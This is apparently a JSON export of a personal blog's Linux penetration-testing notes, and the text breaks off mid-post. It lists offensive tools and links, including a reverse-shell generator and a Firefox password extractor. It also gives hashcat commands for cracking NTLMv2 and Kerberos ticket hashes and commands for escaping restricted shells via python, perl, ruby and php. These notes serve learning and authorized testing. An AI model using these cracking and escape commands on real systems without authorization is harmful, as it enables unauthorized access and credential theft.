http://hacking-printers.net/wiki/index.php/Printer_Security_Testing_Cheat_Sheet |\n\n<br>\n\n## Tools\n\n| Description | Link |\n| --- | --- |\n| Multiple GNOME terminals in one window | https://github.com/gnome-terminator/terminator |\n| Recon tool | https://github.com/21y4d/nmapAutomator |\n| Colection of lists | https://github.com/danielmiessler/SecLists |\n| Content discovery tool | https://github.com/epi052/feroxbuster |\n| Foxyproxy browser extension | https://github.com/foxyproxy/browser-extension |\n| CLI clipboard | https://github.com/astrand/xclip |\n| Analyze processes | https://github.com/DominicBreuker/pspy |\n| Transparent proxy server | https://github.com/sshuttle/sshuttle |\n| TCP/UDP tunnel over HTTP  | https://github.com/jpillora/chisel |\n| Reverse Tunneling tool | https://github.com/sysdream/ligolo |\n| Suggest exploits | https://github.com/jondonas/linux-exploit-suggester-2 |\n| Enumeration similar to nmap automator |  https://github.com/wirzka/incursore |\n| Discover credentials in subdirectories | https://github.com/t3l3machus/eviltree |\n| OS fingerprinting tool | https://github.com/binarytrails/xprobe2 |\n| Keyword-based password mutations | https://github.com/t3l3machus/psudohash |\n| Browser extension for offensive security | https://github.com/LasCC/HackTools |\n| Modular text mode chat client | https://github.com/irssi/irssi |\n| Oracle Database Attacking Tool | https://github.com/quentinhardy/odat |\n| Extract passwords from Mozilla | https://github.com/unode/firefox_decrypt |\n| Python FTP server library | https://github.com/giampaolo/pyftpdlib |\n| Sublime text - text editor | https://www.sublimetext.com/docs/linux_repositories.html |\n| Manage CLI history | https://github.com/dvorka/hstr |\n| Recursive internet scanner | https://github.com/blacklanternsecurity/bbot |\n| Generate usernames for LinkedIn companies | https://github.com/initstring/linkedin2username | \n\n## Web tools\n\n| Enumerate web server based on .ds_store file | https://github.com/Keramas/DS_Walk |\n\n\n<br>\n\n---\n---","source":"_posts/Pentesting/Linux/learning-resources.md","raw":"---\ntitle: Linux - Learning Resources\ndate: 2024-08-01 10:00:00\ncategories:\n  - Pentesting\n  - Linux\ntags:\n  - Pentesting\n  - Linux\n  - Learning Resources\ntoc: true\n---\n\n---\nRelevant materials and insights about penetration testing from and of a Linux environment.\n\n---\n<!-- more -->\n\n## Courses\n\n| Description | Link |\n| --- | --- |\n|  |  |\n\n<br>\n\n## Blogs and explanations\n\n| Description | Link |\n| --- | --- |\n| Windows/Linux Local PrivEsc | https://github.com/sagishahar/lpeworkshop |\n| Generate rev shells | https://weibell.github.io/reverse-shell-generator/ |\n| Metasploit documentation | https://docs.metasploit.com/ |\n| Advance InfoSec Concepts  | https://blog.certcube.com/ |\n| File transfer cheatsheet | https://blog.certcube.com/file-transfer-cheatsheet-for-pentesters/ |\n| Pivoting and SSH tunneling | https://blog.certcube.com/pivoting-and-ssh-port-forwarding-basics/ |\n| Linux ACL (Access control list) | https://www.geeksforgeeks.org/access-control-listsacl-linux/ |\n| Crack hashes online | https://hashes.com/en/decrypt/hash |\n| Crack hashes online | https://crackstation.net/ |\n| Layer 4 attacks | https://charlesreid1.com/wiki/Kali/Layer_4_Attacks |\n\n<br>\n\n## Cheatsheets\n\n| Description | Link |\n| --- | --- |\n| Escape Linux restricted env | https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf |\n| Escape Linux restricted env | https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/ |\n| Linux binaries used for exploitation | https://gtfobins.github.io/ |\n| Printer Security Testing Cheat Sheet | http://hacking-printers.net/wiki/index.php/Printer_Security_Testing_Cheat_Sheet |\n\n<br>\n\n## Tools\n\n| Description | Link |\n| --- | --- |\n| Multiple GNOME terminals in one window | https://github.com/gnome-terminator/terminator |\n| Recon tool | https://github.com/21y4d/nmapAutomator |\n| Colection of lists | https://github.com/danielmiessler/SecLists |\n| Content discovery tool | https://github.com/epi052/feroxbuster |\n| Foxyproxy browser extension | https://github.com/foxyproxy/browser-extension |\n| CLI clipboard | https://github.com/astrand/xclip |\n| Analyze processes | https://github.com/DominicBreuker/pspy |\n| Transparent proxy server | https://github.com/sshuttle/sshuttle |\n| TCP/UDP tunnel over HTTP  | https://github.com/jpillora/chisel |\n| Reverse Tunneling tool | https://github.com/sysdream/ligolo |\n| Suggest exploits | https://github.com/jondonas/linux-exploit-suggester-2 |\n| Enumeration similar to nmap automator |  https://github.com/wirzka/incursore |\n| Discover credentials in subdirectories | https://github.com/t3l3machus/eviltree |\n| OS fingerprinting tool | https://github.com/binarytrails/xprobe2 |\n| Keyword-based password mutations | https://github.com/t3l3machus/psudohash |\n| Browser extension for offensive security | https://github.com/LasCC/HackTools |\n| Modular text mode chat client | https://github.com/irssi/irssi |\n| Oracle Database Attacking Tool | https://github.com/quentinhardy/odat |\n| Extract passwords from Mozilla | https://github.com/unode/firefox_decrypt |\n| Python FTP server library | https://github.com/giampaolo/pyftpdlib |\n| Sublime text - text editor | https://www.sublimetext.com/docs/linux_repositories.html |\n| Manage CLI history | https://github.com/dvorka/hstr |\n| Recursive internet scanner | https://github.com/blacklanternsecurity/bbot |\n| Generate usernames for LinkedIn companies | https://github.com/initstring/linkedin2username | \n\n## Web tools\n\n| Enumerate web server based on .ds_store file | https://github.com/Keramas/DS_Walk |\n\n\n<br>\n\n---\n---","slug":"Pentesting/Linux/learning-resources","published":1,"updated":"2024-09-23T06:18:55.862Z","comments":1,"layout":"post","photos":[],"_id":"cm1emkmhr000j6gvg4av24o3w","content":"<hr>\n<p>Relevant materials and insights about penetration testing from and of a Linux environment.</p>\n<hr>\n<span id=\"more\"></span>\n\n<h2 id=\"Courses\"><a href=\"#Courses\" class=\"headerlink\" title=\"Courses\"></a>Courses</h2><table>\n<thead>\n<tr>\n<th>Description</th>\n<th>Link</th>\n</tr>\n</thead>\n<tbody><tr>\n<td></td>\n<td></td>\n</tr>\n</tbody></table>\n<br>\n\n<h2 id=\"Blogs-and-explanations\"><a href=\"#Blogs-and-explanations\" class=\"headerlink\" title=\"Blogs and explanations\"></a>Blogs and explanations</h2><table>\n<thead>\n<tr>\n<th>Description</th>\n<th>Link</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>Windows&#x2F;Linux Local PrivEsc</td>\n<td><a href=\"https://github.com/sagishahar/lpeworkshop\">https://github.com/sagishahar/lpeworkshop</a></td>\n</tr>\n<tr>\n<td>Generate rev shells</td>\n<td><a href=\"https://weibell.github.io/reverse-shell-generator/\">https://weibell.github.io/reverse-shell-generator/</a></td>\n</tr>\n<tr>\n<td>Metasploit documentation</td>\n<td><a href=\"https://docs.metasploit.com/\">https://docs.metasploit.com/</a></td>\n</tr>\n<tr>\n<td>Advance InfoSec Concepts</td>\n<td><a href=\"https://blog.certcube.com/\">https://blog.certcube.com/</a></td>\n</tr>\n<tr>\n<td>File transfer cheatsheet</td>\n<td><a href=\"https://blog.certcube.com/file-transfer-cheatsheet-for-pentesters/\">https://blog.certcube.com/file-transfer-cheatsheet-for-pentesters/</a></td>\n</tr>\n<tr>\n<td>Pivoting and SSH tunneling</td>\n<td><a href=\"https://blog.certcube.com/pivoting-and-ssh-port-forwarding-basics/\">https://blog.certcube.com/pivoting-and-ssh-port-forwarding-basics/</a></td>\n</tr>\n<tr>\n<td>Linux ACL (Access control list)</td>\n<td><a href=\"https://www.geeksforgeeks.org/access-control-listsacl-linux/\">https://www.geeksforgeeks.org/access-control-listsacl-linux/</a></td>\n</tr>\n<tr>\n<td>Crack hashes online</td>\n<td><a href=\"https://hashes.com/en/decrypt/hash\">https://hashes.com/en/decrypt/hash</a></td>\n</tr>\n<tr>\n<td>Crack hashes online</td>\n<td><a href=\"https://crackstation.net/\">https://crackstation.net/</a></td>\n</tr>\n<tr>\n<td>Layer 4 attacks</td>\n<td><a href=\"https://charlesreid1.com/wiki/Kali/Layer_4_Attacks\">https://charlesreid1.com/wiki/Kali/Layer_4_Attacks</a></td>\n</tr>\n</tbody></table>\n<br>\n\n<h2 id=\"Cheatsheets\"><a href=\"#Cheatsheets\" class=\"headerlink\" title=\"Cheatsheets\"></a>Cheatsheets</h2><table>\n<thead>\n<tr>\n<th>Description</th>\n<th>Link</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>Escape Linux restricted env</td>\n<td><a href=\"https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf\">https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf</a></td>\n</tr>\n<tr>\n<td>Escape Linux restricted env</td>\n<td><a href=\"https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/\">https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/</a></td>\n</tr>\n<tr>\n<td>Linux binaries used for exploitation</td>\n<td><a href=\"https://gtfobins.github.io/\">https://gtfobins.github.io/</a></td>\n</tr>\n<tr>\n<td>Printer Security Testing Cheat Sheet</td>\n<td><a href=\"http://hacking-printers.net/wiki/index.php/Printer_Security_Testing_Cheat_Sheet\">http://hacking-printers.net/wiki/index.php/Printer_Security_Testing_Cheat_Sheet</a></td>\n</tr>\n</tbody></table>\n<br>\n\n<h2 id=\"Tools\"><a href=\"#Tools\" class=\"headerlink\" title=\"Tools\"></a>Tools</h2><table>\n<thead>\n<tr>\n<th>Description</th>\n<th>Link</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>Multiple GNOME terminals in one window</td>\n<td><a href=\"https://github.com/gnome-terminator/terminator\">https://github.com/gnome-terminator/terminator</a></td>\n</tr>\n<tr>\n<td>Recon tool</td>\n<td><a href=\"https://github.com/21y4d/nmapAutomator\">https://github.com/21y4d/nmapAutomator</a></td>\n</tr>\n<tr>\n<td>Colection of lists</td>\n<td><a href=\"https://github.com/danielmiessler/SecLists\">https://github.com/danielmiessler/SecLists</a></td>\n</tr>\n<tr>\n<td>Content discovery tool</td>\n<td><a href=\"https://github.com/epi052/feroxbuster\">https://github.com/epi052/feroxbuster</a></td>\n</tr>\n<tr>\n<td>Foxyproxy browser extension</td>\n<td><a href=\"https://github.com/foxyproxy/browser-extension\">https://github.com/foxyproxy/browser-extension</a></td>\n</tr>\n<tr>\n<td>CLI clipboard</td>\n<td><a href=\"https://github.com/astrand/xclip\">https://github.com/astrand/xclip</a></td>\n</tr>\n<tr>\n<td>Analyze processes</td>\n<td><a href=\"https://github.com/DominicBreuker/pspy\">https://github.com/DominicBreuker/pspy</a></td>\n</tr>\n<tr>\n<td>Transparent proxy server</td>\n<td><a href=\"https://github.com/sshuttle/sshuttle\">https://github.com/sshuttle/sshuttle</a></td>\n</tr>\n<tr>\n<td>TCP&#x2F;UDP tunnel over HTTP</td>\n<td><a href=\"https://github.com/jpillora/chisel\">https://github.com/jpillora/chisel</a></td>\n</tr>\n<tr>\n<td>Reverse Tunneling tool</td>\n<td><a href=\"https://github.com/sysdream/ligolo\">https://github.com/sysdream/ligolo</a></td>\n</tr>\n<tr>\n<td>Suggest exploits</td>\n<td><a href=\"https://github.com/jondonas/linux-exploit-suggester-2\">https://github.com/jondonas/linux-exploit-suggester-2</a></td>\n</tr>\n<tr>\n<td>Enumeration similar to nmap automator</td>\n<td><a href=\"https://github.com/wirzka/incursore\">https://github.com/wirzka/incursore</a></td>\n</tr>\n<tr>\n<td>Discover credentials in subdirectories</td>\n<td><a href=\"https://github.com/t3l3machus/eviltree\">https://github.com/t3l3machus/eviltree</a></td>\n</tr>\n<tr>\n<td>OS fingerprinting tool</td>\n<td><a href=\"https://github.com/binarytrails/xprobe2\">https://github.com/binarytrails/xprobe2</a></td>\n</tr>\n<tr>\n<td>Keyword-based password mutations</td>\n<td><a href=\"https://github.com/t3l3machus/psudohash\">https://github.com/t3l3machus/psudohash</a></td>\n</tr>\n<tr>\n<td>Browser extension for offensive security</td>\n<td><a href=\"https://github.com/LasCC/HackTools\">https://github.com/LasCC/HackTools</a></td>\n</tr>\n<tr>\n<td>Modular text mode chat client</td>\n<td><a href=\"https://github.com/irssi/irssi\">https://github.com/irssi/irssi</a></td>\n</tr>\n<tr>\n<td>Oracle Database Attacking Tool</td>\n<td><a href=\"https://github.com/quentinhardy/odat\">https://github.com/quentinhardy/odat</a></td>\n</tr>\n<tr>\n<td>Extract passwords from Mozilla</td>\n<td><a href=\"https://github.com/unode/firefox_decrypt\">https://github.com/unode/firefox_decrypt</a></td>\n</tr>\n<tr>\n<td>Python FTP server library</td>\n<td><a href=\"https://github.com/giampaolo/pyftpdlib\">https://github.com/giampaolo/pyftpdlib</a></td>\n</tr>\n<tr>\n<td>Sublime text - text editor</td>\n<td><a href=\"https://www.sublimetext.com/docs/linux_repositories.html\">https://www.sublimetext.com/docs/linux_repositories.html</a></td>\n</tr>\n<tr>\n<td>Manage CLI history</td>\n<td><a href=\"https://github.com/dvorka/hstr\">https://github.com/dvorka/hstr</a></td>\n</tr>\n<tr>\n<td>Recursive internet scanner</td>\n<td><a href=\"https://github.com/blacklanternsecurity/bbot\">https://github.com/blacklanternsecurity/bbot</a></td>\n</tr>\n<tr>\n<td>Generate usernames for LinkedIn companies</td>\n<td><a href=\"https://github.com/initstring/linkedin2username\">https://github.com/initstring/linkedin2username</a></td>\n</tr>\n</tbody></table>\n<h2 id=\"Web-tools\"><a href=\"#Web-tools\" class=\"headerlink\" title=\"Web tools\"></a>Web tools</h2><p>| Enumerate web server based on .ds_store file | <a href=\"https://github.com/Keramas/DS_Walk\">https://github.com/Keramas/DS_Walk</a> |</p>\n<br>\n\n<hr>\n<hr>\n","excerpt":"<hr>\n<p>Relevant materials and insights about penetration testing from and of a Linux environment.</p>\n<hr>","more":"<h2 id=\"Courses\"><a href=\"#Courses\" class=\"headerlink\" title=\"Courses\"></a>Courses</h2><table>\n<thead>\n<tr>\n<th>Description</th>\n<th>Link</th>\n</tr>\n</thead>\n<tbody><tr>\n<td></td>\n<td></td>\n</tr>\n</tbody></table>\n<br>\n\n<h2 id=\"Blogs-and-explanations\"><a href=\"#Blogs-and-explanations\" class=\"headerlink\" title=\"Blogs and explanations\"></a>Blogs and explanations</h2><table>\n<thead>\n<tr>\n<th>Description</th>\n<th>Link</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>Windows&#x2F;Linux Local PrivEsc</td>\n<td><a href=\"https://github.com/sagishahar/lpeworkshop\">https://github.com/sagishahar/lpeworkshop</a></td>\n</tr>\n<tr>\n<td>Generate rev shells</td>\n<td><a href=\"https://weibell.github.io/reverse-shell-generator/\">https://weibell.github.io/reverse-shell-generator/</a></td>\n</tr>\n<tr>\n<td>Metasploit documentation</td>\n<td><a href=\"https://docs.metasploit.com/\">https://docs.metasploit.com/</a></td>\n</tr>\n<tr>\n<td>Advance InfoSec Concepts</td>\n<td><a href=\"https://blog.certcube.com/\">https://blog.certcube.com/</a></td>\n</tr>\n<tr>\n<td>File transfer cheatsheet</td>\n<td><a href=\"https://blog.certcube.com/file-transfer-cheatsheet-for-pentesters/\">https://blog.certcube.com/file-transfer-cheatsheet-for-pentesters/</a></td>\n</tr>\n<tr>\n<td>Pivoting and SSH tunneling</td>\n<td><a href=\"https://blog.certcube.com/pivoting-and-ssh-port-forwarding-basics/\">https://blog.certcube.com/pivoting-and-ssh-port-forwarding-basics/</a></td>\n</tr>\n<tr>\n<td>Linux ACL (Access control list)</td>\n<td><a href=\"https://www.geeksforgeeks.org/access-control-listsacl-linux/\">https://www.geeksforgeeks.org/access-control-listsacl-linux/</a></td>\n</tr>\n<tr>\n<td>Crack hashes online</td>\n<td><a href=\"https://hashes.com/en/decrypt/hash\">https://hashes.com/en/decrypt/hash</a></td>\n</tr>\n<tr>\n<td>Crack hashes online</td>\n<td><a href=\"https://crackstation.net/\">https://crackstation.net/</a></td>\n</tr>\n<tr>\n<td>Layer 4 attacks</td>\n<td><a href=\"https://charlesreid1.com/wiki/Kali/Layer_4_Attacks\">https://charlesreid1.com/wiki/Kali/Layer_4_Attacks</a></td>\n</tr>\n</tbody></table>\n<br>\n\n<h2 id=\"Cheatsheets\"><a href=\"#Cheatsheets\" class=\"headerlink\" title=\"Cheatsheets\"></a>Cheatsheets</h2><table>\n<thead>\n<tr>\n<th>Description</th>\n<th>Link</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>Escape Linux restricted env</td>\n<td><a href=\"https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf\">https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf</a></td>\n</tr>\n<tr>\n<td>Escape Linux restricted env</td>\n<td><a href=\"https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/\">https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/</a></td>\n</tr>\n<tr>\n<td>Linux binaries used for exploitation</td>\n<td><a href=\"https://gtfobins.github.io/\">https://gtfobins.github.io/</a></td>\n</tr>\n<tr>\n<td>Printer Security Testing Cheat Sheet</td>\n<td><a href=\"http://hacking-printers.net/wiki/index.php/Printer_Security_Testing_Cheat_Sheet\">http://hacking-printers.net/wiki/index.php/Printer_Security_Testing_Cheat_Sheet</a></td>\n</tr>\n</tbody></table>\n<br>\n\n<h2 id=\"Tools\"><a href=\"#Tools\" class=\"headerlink\" title=\"Tools\"></a>Tools</h2><table>\n<thead>\n<tr>\n<th>Description</th>\n<th>Link</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>Multiple GNOME terminals in one window</td>\n<td><a href=\"https://github.com/gnome-terminator/terminator\">https://github.com/gnome-terminator/terminator</a></td>\n</tr>\n<tr>\n<td>Recon tool</td>\n<td><a href=\"https://github.com/21y4d/nmapAutomator\">https://github.com/21y4d/nmapAutomator</a></td>\n</tr>\n<tr>\n<td>Colection of lists</td>\n<td><a href=\"https://github.com/danielmiessler/SecLists\">https://github.com/danielmiessler/SecLists</a></td>\n</tr>\n<tr>\n<td>Content discovery tool</td>\n<td><a href=\"https://github.com/epi052/feroxbuster\">https://github.com/epi052/feroxbuster</a></td>\n</tr>\n<tr>\n<td>Foxyproxy browser extension</td>\n<td><a href=\"https://github.com/foxyproxy/browser-extension\">https://github.com/foxyproxy/browser-extension</a></td>\n</tr>\n<tr>\n<td>CLI clipboard</td>\n<td><a href=\"https://github.com/astrand/xclip\">https://github.com/astrand/xclip</a></td>\n</tr>\n<tr>\n<td>Analyze processes</td>\n<td><a href=\"https://github.com/DominicBreuker/pspy\">https://github.com/DominicBreuker/pspy</a></td>\n</tr>\n<tr>\n<td>Transparent proxy server</td>\n<td><a href=\"https://github.com/sshuttle/sshuttle\">https://github.com/sshuttle/sshuttle</a></td>\n</tr>\n<tr>\n<td>TCP&#x2F;UDP tunnel over HTTP</td>\n<td><a href=\"https://github.com/jpillora/chisel\">https://github.com/jpillora/chisel</a></td>\n</tr>\n<tr>\n<td>Reverse Tunneling tool</td>\n<td><a href=\"https://github.com/sysdream/ligolo\">https://github.com/sysdream/ligolo</a></td>\n</tr>\n<tr>\n<td>Suggest exploits</td>\n<td><a href=\"https://github.com/jondonas/linux-exploit-suggester-2\">https://github.com/jondonas/linux-exploit-suggester-2</a></td>\n</tr>\n<tr>\n<td>Enumeration similar to nmap automator</td>\n<td><a href=\"https://github.com/wirzka/incursore\">https://github.com/wirzka/incursore</a></td>\n</tr>\n<tr>\n<td>Discover credentials in subdirectories</td>\n<td><a href=\"https://github.com/t3l3machus/eviltree\">https://github.com/t3l3machus/eviltree</a></td>\n</tr>\n<tr>\n<td>OS fingerprinting tool</td>\n<td><a href=\"https://github.com/binarytrails/xprobe2\">https://github.com/binarytrails/xprobe2</a></td>\n</tr>\n<tr>\n<td>Keyword-based password mutations</td>\n<td><a href=\"https://github.com/t3l3machus/psudohash\">https://github.com/t3l3machus/psudohash</a></td>\n</tr>\n<tr>\n<td>Browser extension for offensive security</td>\n<td><a href=\"https://github.com/LasCC/HackTools\">https://github.com/LasCC/HackTools</a></td>\n</tr>\n<tr>\n<td>Modular text mode chat client</td>\n<td><a href=\"https://github.com/irssi/irssi\">https://github.com/irssi/irssi</a></td>\n</tr>\n<tr>\n<td>Oracle Database Attacking Tool</td>\n<td><a href=\"https://github.com/quentinhardy/odat\">https://github.com/quentinhardy/odat</a></td>\n</tr>\n<tr>\n<td>Extract passwords from Mozilla</td>\n<td><a href=\"https://github.com/unode/firefox_decrypt\">https://github.com/unode/firefox_decrypt</a></td>\n</tr>\n<tr>\n<td>Python FTP server library</td>\n<td><a href=\"https://github.com/giampaolo/pyftpdlib\">https://github.com/giampaolo/pyftpdlib</a></td>\n</tr>\n<tr>\n<td>Sublime text - text editor</td>\n<td><a href=\"https://www.sublimetext.com/docs/linux_repositories.html\">https://www.sublimetext.com/docs/linux_repositories.html</a></td>\n</tr>\n<tr>\n<td>Manage CLI history</td>\n<td><a href=\"https://github.com/dvorka/hstr\">https://github.com/dvorka/hstr</a></td>\n</tr>\n<tr>\n<td>Recursive internet scanner</td>\n<td><a href=\"https://github.com/blacklanternsecurity/bbot\">https://github.com/blacklanternsecurity/bbot</a></td>\n</tr>\n<tr>\n<td>Generate usernames for LinkedIn companies</td>\n<td><a href=\"https://github.com/initstring/linkedin2username\">https://github.com/initstring/linkedin2username</a></td>\n</tr>\n</tbody></table>\n<h2 id=\"Web-tools\"><a href=\"#Web-tools\" class=\"headerlink\" title=\"Web tools\"></a>Web tools</h2><p>| Enumerate web server based on .ds_store file | <a href=\"https://github.com/Keramas/DS_Walk\">https://github.com/Keramas/DS_Walk</a> |</p>\n<br>\n\n<hr>\n<hr>"},{"title":"Linux - Others","date":"2024-08-03T09:00:00.000Z","toc":true,"_content":"\n---\nOther interesting things in Linux environments when doing penetration tests.\n\n---\n<!-- more -->\n\n## `python` `FTP` server\n```bash\npip install pyftpdlib\n```\n```python\nfrom pyftpdlib.authorizers import DummyAuthorizer\nfrom pyftpdlib.handlers import FTPHandler\nfrom pyftpdlib.servers import FTPServer\n\nauthorizer = DummyAuthorizer()\n\nauthorizer.add_user(\"user\", \"12345\", \"/home/giampaolo\", perm=\"elradfmwMT\")\nauthorizer.add_anonymous(\"/home/nobody\")\n\nhandler = FTPHandler\nhandler.authorizer = authorizer\n\nserver = FTPServer((\"127.0.0.1\", 21), handler)\nserver.serve_forever()\n```\n\n<br>\n\n## Tcpdump\nDump and sniff packets\n```bash\ntcpdump -i eth0 udp port 53\n```\n\n<br>\n\n## Other\n\n### Crack different hashes\n```bash Crack NTLMv2 hashes\nhashcat -m 5600 hash /usr/share/wordlists/rockyou.txt -o hash.cracked --force\n```\n```bash Crack krb5tgs ticket\nhashcat -m 13100 -a 0 GetUserSPNs.out /usr/share/wordlists/rockyou.txt --force\n```\n<br>\n\n---\n---","source":"_posts/Pentesting/Linux/other.md","raw":"---\ntitle: Linux - Others\ndate: 2024-08-03 12:00:00\ncategories:\n  - Pentesting\n  - Linux\ntags:\n  - Pentesting\n  - Linux\n  - restricted environment\ntoc: true\n---\n\n---\nOther interesting things in Linux environments when doing penetration tests.\n\n---\n<!-- more -->\n\n## `python` `FTP` server\n```bash\npip install pyftpdlib\n```\n```python\nfrom pyftpdlib.authorizers import DummyAuthorizer\nfrom pyftpdlib.handlers import FTPHandler\nfrom pyftpdlib.servers import FTPServer\n\nauthorizer = DummyAuthorizer()\n\nauthorizer.add_user(\"user\", \"12345\", \"/home/giampaolo\", perm=\"elradfmwMT\")\nauthorizer.add_anonymous(\"/home/nobody\")\n\nhandler = FTPHandler\nhandler.authorizer = authorizer\n\nserver = FTPServer((\"127.0.0.1\", 21), handler)\nserver.serve_forever()\n```\n\n<br>\n\n## Tcpdump\nDump and sniff packets\n```bash\ntcpdump -i eth0 udp port 53\n```\n\n<br>\n\n## Other\n\n### Crack different hashes\n```bash Crack NTLMv2 hashes\nhashcat -m 5600 hash /usr/share/wordlists/rockyou.txt -o hash.cracked --force\n```\n```bash Crack krb5tgs ticket\nhashcat -m 13100 -a 0 GetUserSPNs.out /usr/share/wordlists/rockyou.txt --force\n```\n<br>\n\n---\n---","slug":"Pentesting/Linux/other","published":1,"updated":"2024-09-23T06:18:55.864Z","comments":1,"layout":"post","photos":[],"_id":"cm1emkmht000m6gvgbhy89equ","content":"<hr>\n<p>Other interesting things in Linux environments when doing penetration tests.</p>\n<hr>\n<span id=\"more\"></span>\n\n<h2 id=\"python-FTP-server\"><a href=\"#python-FTP-server\" class=\"headerlink\" title=\"python FTP server\"></a><code>python</code> <code>FTP</code> server</h2><pre><code class=\"highlight bash\">pip install pyftpdlib</code></pre>\n<pre><code class=\"highlight python\"><span class=\"keyword\">from</span> pyftpdlib.authorizers <span class=\"keyword\">import</span> DummyAuthorizer\n<span class=\"keyword\">from</span> pyftpdlib.handlers <span class=\"keyword\">import</span> FTPHandler\n<span class=\"keyword\">from</span> pyftpdlib.servers <span class=\"keyword\">import</span> FTPServer\n\nauthorizer = DummyAuthorizer()\n\nauthorizer.add_user(<span class=\"string\">&quot;user&quot;</span>, <span class=\"string\">&quot;12345&quot;</span>, <span class=\"string\">&quot;/home/giampaolo&quot;</span>, perm=<span class=\"string\">&quot;elradfmwMT&quot;</span>)\nauthorizer.add_anonymous(<span class=\"string\">&quot;/home/nobody&quot;</span>)\n\nhandler = FTPHandler\nhandler.authorizer = authorizer\n\nserver = FTPServer((<span class=\"string\">&quot;127.0.0.1&quot;</span>, <span class=\"number\">21</span>), handler)\nserver.serve_forever()</code></pre>\n\n<br>\n\n<h2 id=\"Tcpdump\"><a href=\"#Tcpdump\" class=\"headerlink\" title=\"Tcpdump\"></a>Tcpdump</h2><p>Dump and sniff packets</p>\n<pre><code class=\"highlight bash\">tcpdump -i eth0 udp port 53</code></pre>\n\n<br>\n\n<h2 id=\"Other\"><a href=\"#Other\" class=\"headerlink\" title=\"Other\"></a>Other</h2><h3 id=\"Crack-different-hashes\"><a href=\"#Crack-different-hashes\" class=\"headerlink\" title=\"Crack different hashes\"></a>Crack different hashes</h3><pre><div class=\"caption\"><span>Crack NTLMv2 hashes</span></div><code class=\"highlight bash\">hashcat -m 5600 <span class=\"built_in\">hash</span> /usr/share/wordlists/rockyou.txt -o hash.cracked --force</code></pre>\n<pre><div class=\"caption\"><span>Crack krb5tgs ticket</span></div><code class=\"highlight bash\">hashcat -m 13100 -a 0 GetUserSPNs.out /usr/share/wordlists/rockyou.txt --force</code></pre>\n<br>\n\n<hr>\n<hr>\n","excerpt":"<hr>\n<p>Other interesting things in Linux environments when doing penetration tests.</p>\n<hr>","more":"<h2 id=\"python-FTP-server\"><a href=\"#python-FTP-server\" class=\"headerlink\" title=\"python FTP server\"></a><code>python</code> <code>FTP</code> server</h2><pre><code class=\"highlight bash\">pip install pyftpdlib</code></pre>\n<pre><code class=\"highlight python\"><span class=\"keyword\">from</span> pyftpdlib.authorizers <span class=\"keyword\">import</span> DummyAuthorizer\n<span class=\"keyword\">from</span> pyftpdlib.handlers <span class=\"keyword\">import</span> FTPHandler\n<span class=\"keyword\">from</span> pyftpdlib.servers <span class=\"keyword\">import</span> FTPServer\n\nauthorizer = DummyAuthorizer()\n\nauthorizer.add_user(<span class=\"string\">&quot;user&quot;</span>, <span class=\"string\">&quot;12345&quot;</span>, <span class=\"string\">&quot;/home/giampaolo&quot;</span>, perm=<span class=\"string\">&quot;elradfmwMT&quot;</span>)\nauthorizer.add_anonymous(<span class=\"string\">&quot;/home/nobody&quot;</span>)\n\nhandler = FTPHandler\nhandler.authorizer = authorizer\n\nserver = FTPServer((<span class=\"string\">&quot;127.0.0.1&quot;</span>, <span class=\"number\">21</span>), handler)\nserver.serve_forever()</code></pre>\n\n<br>\n\n<h2 id=\"Tcpdump\"><a href=\"#Tcpdump\" class=\"headerlink\" title=\"Tcpdump\"></a>Tcpdump</h2><p>Dump and sniff packets</p>\n<pre><code class=\"highlight bash\">tcpdump -i eth0 udp port 53</code></pre>\n\n<br>\n\n<h2 id=\"Other\"><a href=\"#Other\" class=\"headerlink\" title=\"Other\"></a>Other</h2><h3 id=\"Crack-different-hashes\"><a href=\"#Crack-different-hashes\" class=\"headerlink\" title=\"Crack different hashes\"></a>Crack different hashes</h3><pre><div class=\"caption\"><span>Crack NTLMv2 hashes</span></div><code class=\"highlight bash\">hashcat -m 5600 <span class=\"built_in\">hash</span> /usr/share/wordlists/rockyou.txt -o hash.cracked --force</code></pre>\n<pre><div class=\"caption\"><span>Crack krb5tgs ticket</span></div><code class=\"highlight bash\">hashcat -m 13100 -a 0 GetUserSPNs.out /usr/share/wordlists/rockyou.txt --force</code></pre>\n<br>\n\n<hr>\n<hr>"},{"title":"Linux - Restricted environments","date":"2024-08-03T08:00:00.000Z","toc":true,"_content":"\n---\nEscape restricted Linux environments.\n\n---\n<!-- more -->\n\n## List of restricted environments\n```bash\nrbash\nrsh\nrksh\nrzsh\nlshell\n```\n\n<br>\n\n## Environment reconnaissance\n```bash See exported environment variables\nenv\n```\n```bash Find the PATH\necho $PATH\n```\n```bash View the shell used\necho $SHELL\necho $0\n```\n```bash View available commands in /usr/bin\nls -lasR /usr/bin\n```\n```bash Check the availability of a command\ntype -a command\ntype -a ls\n```\n```bash Can you use '/'?\n/bin/sh\n```\n```bash Can you set env variables?\nexport PATH=/bin:/usr/bin:$PATH\nexport SHELL=/bin/sh\n```\n```bash Can you copy files into existing PATH?\ncp /bin/sh /dir/inside/PATH; sh\n```\n```bash List available commands\ncompgen -c\n```\n\n<br>\n\n## Use built-in shells\n```bash\n# Attempt to spawn a bash shell\n/bin/bash\nbash -i\nexec /bin/bash\n\n# If bash is restricted, try sh\n/bin/sh\n\n# If neither works, try other common shells\npython -c 'import pty; pty.spawn(\"/bin/bash\")'\nperl -e 'exec \"/bin/sh\";'\nruby -e 'exec \"/bin/sh\"'\nphp -r 'system(\"/bin/bash\");'\nphp -r 'shell_exec(\"/bin/bash\");'\nphp -a # interactive shell\n```\n\n<br>\n\n## Use SSH for remote access\n```bash Try to SSH to localhost\nssh user@localhost\n```\n```bash Replace shell with a new one running as login shell\nssh user@$IP -t \"bash -l\"\n```\n```bash Start bash without 